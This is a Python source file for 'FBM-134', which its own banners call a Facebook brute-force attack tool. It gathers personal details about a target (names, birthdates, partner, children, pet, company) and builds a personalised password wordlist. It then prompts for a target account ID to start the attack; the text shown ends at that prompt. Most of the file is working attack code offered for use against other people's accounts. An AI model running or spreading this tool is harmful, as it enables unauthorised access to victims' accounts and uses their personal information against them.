import requests
import os
import socket
import time
import argparse
import itertools
import threading
import sys
import functools
import configparser
import urllib.error
import urllib.parse
import urllib.request
import csv
import gzip
from random import choice
from datetime import datetime
now = datetime.now()

#[variabel] Team
_Team___ = "Cyber-Security-Dev"
_version = "v1.0.2020-dev-"

_______option = {}

# class Kumpulan const


class const():
    ResetAll = "\033[0m"
    Dim = "\033[2m"
    Bold = "\033[1m"
    Underlined = "\033[4m"
    Blink = "\033[5m"
    Reverse = "\033[7m"
    Hidden = "\033[8m"

    ResetBold = "\033[21m"
    ResetDim = "\033[22m"
    ResetUnderlined = "\033[24m"
    ResetBlink = "\033[25m"
    ResetReverse = "\033[27m"
    ResetHidden = "\033[28m"


def _____________banner():
    numList = ["Banner/Linux/banner01.txt", "Banner/Linux/banner02.txt", "Banner/Linux/banner03.txt",
               "Banner/Linux/banner04.txt", "Banner/Linux/banner05.txt", "Banner/Linux/banner06.txt", "Banner/Linux/banner07.txt"]
    for x in range(1):
        file__________banner = choice(numList)
        if file__________banner == "Banner/Linux/banner01.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + " Version : v1.0.2020-dev- ")
            print(colors.White + " Code : 46 42 4D 2D 31 33 34")
            print(colors.White + " ROC:LOC")
            print(const.ResetDim + colors.LightBlue +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner02.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + " FBM-134 : Use This Tool Wisely And Be A Good User ")
            print(const.ResetDim + colors.LightRed +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner03.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White +
                  " FBM-134 : Damage that occurs is not our responsibility ")
            print(const.ResetDim + colors.LightBlue +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner04.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + "  FBM-134 Park, Facebook Brute Force Attack")
            print(colors.White + "  Version v1.0.2020-dev- , -")
            print(colors.White + "  Ready...")
            print(const.ResetDim + colors.LightMagenta +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner05.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + " Version : v1.0.2020-dev- ")
            print(colors.White + " Code : 46 42 4D 2D 31 33 34")
            print(colors.White + " ROC:LOC")
            print(const.ResetDim + colors.LightRed +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner06.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + " FBM-134 : Use This Tool Wisely And Be A Good User ")
            print(const.ResetDim + colors.LightGray +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner07.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White +
                  " FBM-134 : Damage that occurs is not our responsibility ")
            print(const.ResetDim + colors.LightBlue +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
def __banner_worldlis():
    fileBanner_ = open("Banner/Linux/banner03.txt")
    print(' ')
    print(colors.White + " FBM-134 : Damage that occurs is not our responsibility ")
    print(const.ResetDim + colors.LightBlue +
          fileBanner_.read() + colors.Green)
    print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
          colors.LightGreen + "                                ]")
    print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
          " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
    print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
          " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
    print(' ')
    fileBanner_.close()
    pass

def __banner_warning():
    fileBanner_ = open("Banner/Linux/banner03.txt")
    print(' ')
    print(colors.White + " FBM-134 : Damage that occurs is not our responsibility ")
    print(const.ResetDim + colors.LightBlue +
          fileBanner_.read() + colors.Green)
    print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
          colors.LightGreen + "                                ]")
    print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
          " FBM-134 : Brute Force Blocked for More Than 1 Hour" + colors.LightGreen + "]")
    print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
          " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
    print(' ')

#[Generate]
def _____________Generate____(_variabel__):

    chars__ = _______option["_________global"]["________chars"]
    years__ = _______option["_________global"]["________years"]
    froms__ = _______option["_________global"]["________numfr"]
    numto__ = _______option["_________global"]["________numto"]

    _variabel__["specialchar______"] = []

    if _variabel__["___spechars_"] == 'Y' or _variabel__["___spechars_"] == "y":
        for __x___ in chars__:
            _variabel__["specialchar______"].append(__x___)
            for _x__ in chars__:
                _variabel__["specialchar______"].append(__x___ + _x__)
                for _x_ in chars__:
                    _variabel__["specialchar______"].append(
                        __x___ + _x__ + _x_)

    os.system("clear")
    print(colors.LightRed + "[*] " + colors.LightGreen +
          "Now Create A Dictionary Password Base ... ")
    time.sleep(1)

    #[]first

    __B = _variabel__["_v_"][-2:]
    __U = _variabel__["_v_"][-3:]
    __Y = _variabel__["_v_"][-4:]
    __x = _variabel__["_v_"][1:2]
    __G = _variabel__["_v_"][3:4]
    __C = _variabel__["_v_"][:2]
    __E = _variabel__["_v_"][2:4]

    #[] partners

    wifeb_yy = _variabel__["____Birthdatepartners__"][-2:]
    wifeb_yyy = _variabel__["____Birthdatepartners__"][-3:]
    wifeb_yyyy = _variabel__["____Birthdatepartners__"][-4:]
    wifeb_xd = _variabel__["____Birthdatepartners__"][1:2]
    wifeb_xm = _variabel__["____Birthdatepartners__"][3:4]
    wifeb_dd = _variabel__["____Birthdatepartners__"][:2]
    wifeb_mm = _variabel__["____Birthdatepartners__"][2:4]

    #[Birtdays] Child

    kidb_yy = _variabel__["____Birthdatekid__"][-2:]
    kidb_yyy = _variabel__["____Birthdatekid__"][-3:]
    kidb_yyyy = _variabel__["____Birthdatekid__"][-4:]
    kidb_xd = _variabel__["____Birthdatekid__"][1:2]
    kidb_xm = _variabel__["____Birthdatekid__"][3:4]
    kidb_dd = _variabel__["____Birthdatekid__"][:2]
    kidb_mm = _variabel__["____Birthdatekid__"][2:4]

    #[Convert] first letters to uppercase...

    nameup = _variabel__["_name_"].title()
    surnameup = _variabel__["_surname_"].title()
    nickup = _variabel__["_Nick_"].title()
    wifeup = _variabel__["_partners__"].title()
    wifenup = _variabel__["____Nickpartners__"].title()
    kidup = _variabel__["______kid"].title()
    kidnup = _variabel__["____nickid_"].title()
    petup = _variabel__["__pet_"].title()
    companyup = _variabel__["__company_"].title()

    wordsup = []
    wordsup = list(map(str.title, _variabel__["___words_"]))

    word = _variabel__["___words_"] + wordsup

    # reverse a name

    rev_name = _variabel__["_name_"][::-1]
    rev_nameup = nameup[::-1]
    rev_nick = _variabel__["_Nick_"][::-1]
    rev_nickup = nickup[::-1]
    rev_wife = _variabel__["_partners__"][::-1]
    rev_wifeup = wifeup[::-1]
    rev_kid = _variabel__["______kid"][::-1]
    rev_kidup = kidup[::-1]

    reverse = [
        rev_name,
        rev_nameup,
        rev_nick,
        rev_nickup,
        rev_wife,
        rev_wifeup,
        rev_kid,
        rev_kidup,
    ]
    rev_n = [rev_name, rev_nameup, rev_nick, rev_nickup]
    rev_w = [rev_wife, rev_wifeup]
    rev_k = [rev_kid, rev_kidup]
    # Let's do some serious work! This will be a mess of code, but... who cares? :)

    # Birthdays combinations

    bds = [
        __B,
        __U,
        __Y,
        __x,
        __G,
        __C,
        __E,
    ]

    bdss = []

    for bds1 in bds:
        bdss.append(bds1)
        for bds2 in bds:
            if bds.index(bds1) != bds.index(bds2):
                bdss.append(bds1 + bds2)
                for bds3 in bds:
                    if (
                        bds.index(bds1) != bds.index(bds2)
                        and bds.index(bds2) != bds.index(bds3)
                        and bds.index(bds1) != bds.index(bds3)
                    ):
                        bdss.append(bds1 + bds2 + bds3)

                # For a woman...
    wbds = [wifeb_yy, wifeb_yyy, wifeb_yyyy,
            wifeb_xd, wifeb_xm, wifeb_dd, wifeb_mm]

    wbdss = []

    for wbds1 in wbds:
        wbdss.append(wbds1)
        for wbds2 in wbds:
            if wbds.index(wbds1) != wbds.index(wbds2):
                wbdss.append(wbds1 + wbds2)
                for wbds3 in wbds:
                    if (
                        wbds.index(wbds1) != wbds.index(wbds2)
                        and wbds.index(wbds2) != wbds.index(wbds3)
                        and wbds.index(wbds1) != wbds.index(wbds3)
                    ):
                        wbdss.append(wbds1 + wbds2 + wbds3)

                # and a child...
    kbds = [kidb_yy, kidb_yyy, kidb_yyyy, kidb_xd, kidb_xm, kidb_dd, kidb_mm]

    kbdss = []

    for kbds1 in kbds:
        kbdss.append(kbds1)
        for kbds2 in kbds:
            if kbds.index(kbds1) != kbds.index(kbds2):
                kbdss.append(kbds1 + kbds2)
                for kbds3 in kbds:
                    if (
                        kbds.index(kbds1) != kbds.index(kbds2)
                        and kbds.index(kbds2) != kbds.index(kbds3)
                        and kbds.index(kbds1) != kbds.index(kbds3)
                    ):
                        kbdss.append(kbds1 + kbds2 + kbds3)

                # string combinations....

    kombinaac = [_variabel__["__pet_"], petup,
                 _variabel__["__company_"], companyup]

    kombina = [
        _variabel__["_name_"],
        _variabel__["_surname_"],
        _variabel__["_Nick_"],
        nameup,
        surnameup,
        nickup,
    ]

    kombinaw = [
        _variabel__["_partners__"],
        _variabel__["____Nickpartners__"],
        wifeup,
        wifenup,
        _variabel__["_surname_"],
        surnameup,
    ]

    kombinak = [
        _variabel__["______kid"],
        _variabel__["____nickid_"],
        kidup,
        kidnup,
        _variabel__["_surname_"],
        surnameup,
    ]

    kombinaa = []
    for kombina1 in kombina:
        kombinaa.append(kombina1)
        for kombina2 in kombina:
            if kombina.index(kombina1) != kombina.index(kombina2) and kombina.index(
                kombina1.title()
            ) != kombina.index(kombina2.title()):
                kombinaa.append(kombina1 + kombina2)

    kombinaaw = []
    for kombina1 in kombinaw:
        kombinaaw.append(kombina1)
        for kombina2 in kombinaw:
            if kombinaw.index(kombina1) != kombinaw.index(kombina2) and kombinaw.index(
                kombina1.title()
            ) != kombinaw.index(kombina2.title()):
                kombinaaw.append(kombina1 + kombina2)

    kombinaak = []
    for kombina1 in kombinak:
        kombinaak.append(kombina1)
        for kombina2 in kombinak:
            if kombinak.index(kombina1) != kombinak.index(kombina2) and kombinak.index(
                kombina1.title()
            ) != kombinak.index(kombina2.title()):
                kombinaak.append(kombina1 + kombina2)

    kombi = {}
    kombi[1] = list(Hackerkonx(kombinaa, bdss))
    kombi[1] += list(Hackerkonx(kombinaa, bdss, "_"))
    kombi[2] = list(Hackerkonx(kombinaaw, wbdss))
    kombi[2] += list(Hackerkonx(kombinaaw, wbdss, "_"))
    kombi[3] = list(Hackerkonx(kombinaak, kbdss))
    kombi[3] += list(Hackerkonx(kombinaak, kbdss, "_"))
    kombi[4] = list(Hackerkonx(kombinaa, years__))
    kombi[4] += list(Hackerkonx(kombinaa, years__, "_"))
    kombi[5] = list(Hackerkonx(kombinaac, years__))
    kombi[5] += list(Hackerkonx(kombinaac, years__, "_"))
    kombi[6] = list(Hackerkonx(kombinaaw, years__))
    kombi[6] += list(Hackerkonx(kombinaaw, years__, "_"))
    kombi[7] = list(Hackerkonx(kombinaak, years__))
    kombi[7] += list(Hackerkonx(kombinaak, years__, "_"))
    kombi[8] = list(Hackerkonx(word, bdss))
    kombi[8] += list(Hackerkonx(word, bdss, "_"))
    kombi[9] = list(Hackerkonx(word, wbdss))
    kombi[9] += list(Hackerkonx(word, wbdss, "_"))
    kombi[10] = list(Hackerkonx(word, kbdss))
    kombi[10] += list(Hackerkonx(word, kbdss, "_"))
    kombi[11] = list(Hackerkonx(word, years__))
    kombi[11] += list(Hackerkonx(word, years__, "_"))
    kombi[12] = [""]
    kombi[13] = [""]
    kombi[14] = [""]
    kombi[15] = [""]
    kombi[16] = [""]
    kombi[21] = [""]
    if _variabel__["___random___"] == "y" or _variabel__["___random___"] == "Y":
        kombi[12] = list(concats(word, froms__, numto__))
        kombi[13] = list(concats(kombinaa, froms__, numto__))
        kombi[14] = list(concats(kombinaac, froms__, numto__))
        kombi[15] = list(concats(kombinaaw, froms__, numto__))
        kombi[16] = list(concats(kombinaak, froms__, numto__))
        kombi[21] = list(concats(reverse, froms__, numto__))
    kombi[17] = list(Hackerkonx(reverse, years__))
    kombi[17] += list(Hackerkonx(reverse, years__, "_"))
    kombi[18] = list(Hackerkonx(rev_w, wbdss))
    kombi[18] += list(Hackerkonx(rev_w, wbdss, "_"))
    kombi[19] = list(Hackerkonx(rev_k, kbdss))
    kombi[19] += list(Hackerkonx(rev_k, kbdss, "_"))
    kombi[20] = list(Hackerkonx(rev_n, bdss))
    kombi[20] += list(Hackerkonx(rev_n, bdss, "_"))
    komb001 = [""]
    komb002 = [""]
    komb003 = [""]
    komb004 = [""]
    komb005 = [""]
    komb006 = [""]
    if len(_variabel__["specialchar______"]) > 0:
        komb001 = list(Hackerkonx(kombinaa, _variabel__["specialchar______"]))
        komb002 = list(Hackerkonx(kombinaac, _variabel__["specialchar______"]))
        komb003 = list(Hackerkonx(kombinaaw, _variabel__["specialchar______"]))
        komb004 = list(Hackerkonx(kombinaak, _variabel__["specialchar______"]))
        komb005 = list(Hackerkonx(word, _variabel__["specialchar______"]))
        komb006 = list(Hackerkonx(reverse, _variabel__["specialchar______"]))

    os.system("clear")
    print(colors.LightRed + "[*] " + colors.LightGreen +
          "Generate Dictionary Type Bullets And Eliminate Disabilities")
    time.sleep(2)

    komb_unique = {}
    for i in range(1, 22):
        komb_unique[i] = list(dict.fromkeys(kombi[i]).keys())

    komb_unique01 = list(dict.fromkeys(kombinaa).keys())
    komb_unique02 = list(dict.fromkeys(kombinaac).keys())
    komb_unique03 = list(dict.fromkeys(kombinaaw).keys())
    komb_unique04 = list(dict.fromkeys(kombinaak).keys())
    komb_unique05 = list(dict.fromkeys(word).keys())
    komb_unique07 = list(dict.fromkeys(komb001).keys())
    komb_unique08 = list(dict.fromkeys(komb002).keys())
    komb_unique09 = list(dict.fromkeys(komb003).keys())
    komb_unique010 = list(dict.fromkeys(komb004).keys())
    komb_unique011 = list(dict.fromkeys(komb005).keys())
    komb_unique012 = list(dict.fromkeys(komb006).keys())

    uniqlist = (
        bdss
        + wbdss
        + kbdss
        + reverse
        + komb_unique01
        + komb_unique02
        + komb_unique03
        + komb_unique04
        + komb_unique05
    )

    for i in range(1, 21):
        uniqlist += komb_unique[i]

    uniqlist += (
        komb_unique07
        + komb_unique08
        + komb_unique09
        + komb_unique010
        + komb_unique011
        + komb_unique012
    )
    unique_lista = list(dict.fromkeys(uniqlist).keys())
    unique_leet = []
    if _variabel__["____mode"] == "y" or _variabel__["____mode"] == "Y":
        for (
            x
        ) in (
            unique_lista
        ):  # if you want to add more leet chars, you will need to add more lines in cupp.cfg too...

            x = make_leet(x)  # convert to leet
            unique_leet.append(x)

    unique_list = unique_lista + unique_leet

    unique_list_finished = []
    unique_list_finished = [
        x
        for x in unique_list
        if len(x) < _______option["_________global"]["________ctofr"] and len(x) > _______option["_________global"]["________cfrom"]
    ]

    print_______________________________(
        "Generate/" + _variabel__["_name_"] + ".txt", unique_list_finished)


# Class Kumpulan Warna
class colors():
    Default = "\033[39m"
    Black = "\033[30m"
    Red = "\033[31m"
    Green = "\033[32m"
    Yellow = "\033[33m"
    Blue = "\033[34m"
    Magenta = "\033[35m"
    Cyan = "\033[36m"
    LightGray = "\033[37m"
    DarkGray = "\033[90m"
    LightRed = "\033[91m"
    LightGreen = "\033[92m"
    LightYellow = "\033[93m"
    LightBlue = "\033[94m"
    LightMagenta = "\033[95m"
    LightCyan = "\033[96m"
    White = "\033[97m"

# function Password Basis Kamus


def function(_______filename):

    if os.path.isfile(_______filename):

        con_____ = configparser.ConfigParser()
        con_____.read(_______filename)

        _______option["_________global"] = {

            "________years": con_____.get("________years", "________years").split(","),
            "________chars": con_____.get("________specialchars_", "________chars").split(","),
            "________numfr": con_____.getint("________num", "___from"),
            "________numto": con_____.getint("________num", "_____to"),
            "________cfrom": con_____.getint("________num", "__wcfrom"),
            "________ctofr": con_____.getint("________num", "___wcto"),
            "________thres": con_____.getint("________num", "__thres"),
            "_______geturl": con_____.get("____ecto", "______ectourl"),
            "_____download": con_____.get("___download", "______dict"),


        }

        ___leet = functools.partial(con_____.get, "___leet_")
        _____tc = {}
        ____ers = {"c", "y", "b", "e", "r", "i", "n", "d"}

        for _et in ____ers:
            _____tc[_et] = con_____.get("___leet_", _et)
        _______option["_____ETT"] = _____tc

        return True

    else:
        print(colors.LightRed + "[*] " + colors.LightGreen +
              "Configuration file " + _______filename + " not found!")
        sys.exit(colors.LightRed +
                 "[*] " + colors.LightGreen + "Exiting." + colors.Default)

        return False

# print Hasil Ganerate Password Basis Kamus


def print_______________________________(filename, unique_list_finished):
    try:
        f = open(filename, "w")
        unique_list_finished.sort()
        f.write(os.linesep.join(unique_list_finished))
        f.close()
        f = open(filename, "r")
        lines = 0
        for line in f:
            lines += 1
        f.close()
        print(colors.LightRed + "[+] " + colors.LightGreen +
              "Saving Bullets Dictionary type (S) ...")
        time.sleep(2)
        os.system("clear")
        _____________banner()
        print(colors.LightRed + "[+] " + colors.LightGreen + "Now You Need Your Weapon Ready " + colors.LightRed +
              filename + colors.LightGreen + " Counting " + colors.LightRed + str(lines) + colors.Default)
        __option_ = input(colors.LightRed + "[+] " + colors.LightGreen +
                          "Do you want to start the attack ? Y/[N]: ").lower()

        if __option_ == "y":
            _no___ = str(lines)
            ___attack(filename, _no___)
            pass
    except KeyboardInterrupt:
        os.system("clear")
        print(colors.Red + "[*] " + colors.LightGreen  + "Shutting Down The FBM-134 Console" + colors.Default)       
# Class Loading COnsole FBM-134

'''
	FB-Brute Force 1.0 -x
	Jayalah Indonesiaku
	(c)2020 
	https://github.com/byindosecurity
	[IP] 114.125.56.148
'''

# Class Loading COnsole FBM-134


def ___Loading_():
    os.system("clear")
    _interactive()
    pass


# interactive Console User Memilih Options
def _interactive():
    try:
        print(colors.LightRed + "[*] " + colors.LightGreen +
              "Starting persistent handler(s)")
        time.sleep(3)
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        __input = input(colors.LightRed + "[*] " + colors.LightGreen + "Do you want to concatenate all words from wordlist? Y/[N]: ")

        if __input == 'y' or __input == 'Y':
            _cartridge()
            pass
        elif __input == 'n' or __input == 'N':
            os.system('clear')
            _pintas()
        elif SomeException:
            print("sabar Dung bos")
        pass
    except KeyboardInterrupt:
        os.system("clear")
        print(colors.Red + "[*] " + colors.LightGreen  + "Shutting Down The FBM-134 Console" + colors.Default)

# Start The worldlist Proses


def _cartridge():
    try:
        _variabel__ = {}

    # input[Name]
        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _name_ = input("Name :~$ ")
        while len(_name_) == 0 or _name_ == " " or _name_ == "  " or _name_ == "   ":
            os.system("clear")
            print(colors.LightRed +
                  "[-] You must enter a name at least!" + colors.LightGreen)
            time.sleep(1)
            _name_ = input("Name:~$ ").lower()
        _variabel__["_name_"] = str(_name_)

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["_Nick_"] = input("Nick Name:~$ ").lower()

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["_surname_"] = input("Surname:~$ ").lower()

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _v_ = input("Birthdate:~$ ").lower()
        while len(_v_) != 0 and len(_v_) != 8:
            os.system("clear")
            print(colors.LightRed +
                  "[-] You must enter 8 digits for birthday!" + colors.LightGreen)
            time.sleep(1)
            _v_ = input("Birthdate:~$ ").lower()
        _variabel__["_v_"] = str(_v_)

    # input[Partners]

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["_partners__"] = input("Partners Name:~$ ").lower()

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["____Nickpartners__"] = input("Partners Nickname:~$ ").lower()

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        ____Birthdatepartners__ = input("Partners Birthdate:~$ ").lower()
        while len(____Birthdatepartners__) != 0 and len(____Birthdatepartners__) != 8:
            os.system("clear")
            print(colors.LightRed +
                  "[-] You must enter 8 digits for birthday!" + colors.LightGreen)
            ____Birthdatepartners__ = input("Partners Birthdate:~$ ").lower()
        _variabel__["____Birthdatepartners__"] = str(____Birthdatepartners__)

    # Input[Child's]

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["______kid"] = input("Child's Name:~$ ").lower()

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["____nickid_"] = input("Child's Nickname:~$ ").lower()

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        ____Birthdatekid__ = input("Child's Birthdate:~$ ")
        while len(____Birthdatekid__) != 0 and len(____Birthdatekid__) != 8:
            os.system("clear")
            print(colors.LightRed +
                  "[-] You must enter 8 digits for birthday!" + colors.LightGreen)
            ____Birthdatekid__ = input("Child's Birthdate:~$ ")
        _variabel__["____Birthdatekid__"] = str(____Birthdatekid__)

    # Input[Pet's]

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["__pet_"] = input("Pet's Name:~$ ").lower()

    # Input[company]

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["__company_"] = input("company Name:~$ ")

    # Input[words]

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["___words_"] = [""]
        words___ = input(colors.LightRed + "[*] " + colors.LightGreen +
                         "Apakah Anda ingin menambahkan beberapa kata kunci ? Y/[N]: ")
        words____ = ""

        if words___ == 'y' or words___ == 'Y':
            os.system("clear")
            __banner_worldlis()
            print(colors.LightRed + "[*] " +
                  colors.LightGreen + "FBM-134 " + _version)
            time.sleep(1)
            words____ = input(
                colors.LightRed + "[*] " + colors.LightGreen + "Please enter the words : ").replace(" ", "")
        _variabel__["___words_"] = words____.split(",")

    # Input[specialchar]

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["___spechars_"] = input(
            colors.LightRed + "[*] " + colors.LightGreen + "karakter khusus di akhir kata ? Y/[N]: ").lower()

    # Input[Random Number]

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["___random___"] = input(
            colors.LightRed + "[*] " + colors.LightGreen + "Tambahkan Beberapa Angka Acak Di Akhir Kata ? Y/[N]: ").lower()

    # Input[Leet Mode]

        os.system("clear")
        __banner_worldlis()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        _variabel__["____mode"] = input(
            colors.LightRed + "[*] " + colors.LightGreen + "Leet mode? Y/[N]: ").lower()

        _____________Generate____(_variabel__)
    except KeyboardInterrupt:
        os.system("clear")
        print(colors.Red + "[*] " + colors.LightGreen  + "Shutting Down The FBM-134 Console" + colors.Default)    



#[Generate] Password Basis Kamus
def make_leet(x):
    """convert string to leet"""
    for letter, leetletter in _______option["_____ETT"].items():
        x = x.replace(letter, leetletter)
    return x


# for concatenations...
def concats(seq, start, stop):
    for mystr in seq:
        for num in range(start, stop):
            yield mystr + str(num)


# for sorting and making combinations...
def Hackerkonx(seq, start, special=""):
    for mystr in seq:
        for mystr1 in start:
            yield mystr + special + mystr1


def _returnpintas():
    try:
        filename_ = input(colors.LightRed +
                          "[*] " + colors.LightGreen + "Enter[Worldlist]:~$ ")
        if (filename_.find('txt') != -1):
            time.sleep(1)
            f = open(filename_, "r")
            lines = 0
            for line in f:
                lines += 1
            f.close()
            _no___ = str(lines)
            ___attack(filename_, _no___)
        else:
            os.system('clear')
            print(colors.LightRed + "[*] " +
                  colors.LightGreen + "FBM-134 " + _version)
            strlip = (filename_ + ".txt")
            time.sleep(1)
            f = open(strlip, "r")
            lines = 0
            for line in f:
                lines += 1
            f.close()
            _no___ = str(lines)
            ___attack(strlip, _no___)
    except FileNotFoundError:
        os.system("clear")
        print(colors.LightRed +
                "[-] The file You Entered Does Not Exist!" + colors.LightGreen)
        return _returnpintas()

def _pintas():
    try:
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        filename_ = input(colors.LightRed +
                          "[*] " + colors.LightGreen + "Enter[Worldlist]:~$ ")
        if (filename_.find('txt') != -1):
            time.sleep(1)
            f = open(filename_, "r")
            lines = 0
            for line in f:
                lines += 1
            f.close()
            _no___ = str(lines)
            ___attack(filename_, _no___)
        else:
            os.system('clear')
            print(colors.LightRed + "[*] " +
                  colors.LightGreen + "FBM-134 " + _version)
            strlip = (filename_ + ".txt")
            time.sleep(1)
            f = open(strlip, "r")
            lines = 0
            for line in f:
                lines += 1
            f.close()
            _no___ = str(lines)
            ___attack(strlip, _no___)
    except FileNotFoundError:
        os.system("clear")
        print(colors.LightRed +
                "[-] The file You Entered Does Not Exist!" + colors.LightGreen)
        return _returnpintas()


#[Generate] Password Basis Kamus
def __Starting_():

    function(os.path.join(os.path.dirname(
        os.path.realpath(__file__)), "configuration.cfg"))

    _str_ = False

    if _str_ == False:
        ___Loading_()


# option Attack Random Facebook
done = False


def ___attack(filename, _no___):
    try:
        os.system('clear')
        ___open = open(filename, 'r')
        _n = 0
        _x__________ = 0
        _____________banner()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        u________ = input(colors.LightRed +
                          "[*] " + colors.LightGreen + "Target[ID]:~$ ")
